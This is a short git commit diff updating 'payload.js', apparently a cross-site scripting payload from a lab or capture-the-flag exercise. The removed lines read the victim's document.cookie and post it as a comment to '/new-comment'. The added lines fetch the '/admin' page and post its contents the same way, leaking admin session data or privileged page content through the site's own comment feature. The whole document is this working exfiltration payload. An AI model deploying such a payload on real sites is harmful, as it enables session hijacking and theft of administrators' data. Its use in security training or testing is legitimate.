6bc76bdaaeb0b506ad78627dc733e256ae3e12fd
allc-auto <45149524+allc-auto@users.noreply.github.com>
2023-05-04 19:05:54 +0100

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,9 +1,11 @@
 console.log('Payload running')
-const data = new URLSearchParams()
-data.append('name', 'admin')
-data.append('comment', 'comment' + document.cookie)
-fetch('/new-comment', {
-  method: 'POST',
-  body: data
+fetch('/admin').then((r) => r.text()).then((r) => {
+  const data = new URLSearchParams()
+  data.append('name', 'admin')
+  data.append('comment', 'comment ' + r)
+  fetch('/new-comment', {
+    method: 'POST',
+    body: data
+  })
 })
 console.log('Payload finished')
